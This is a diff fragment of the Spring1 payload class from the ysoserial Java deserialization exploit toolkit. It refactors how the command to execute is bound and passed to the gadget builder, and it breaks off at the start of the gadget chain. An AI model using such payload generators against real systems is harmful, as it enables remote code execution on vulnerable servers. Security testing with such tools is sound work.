@@ -10,6 +10,8 @@ import javax.xml.transform.Templates;
 
 import org.springframework.beans.factory.ObjectFactory;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -48,7 +50,16 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
 public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 	
+	@Bind private String command;
+	
+	/**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
 	public Object getObject(final String command) throws Exception {
+		return getObject();
+	}
+
+	public Object getObject() throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 		
 		final ObjectFactory objectFactoryProxy = 
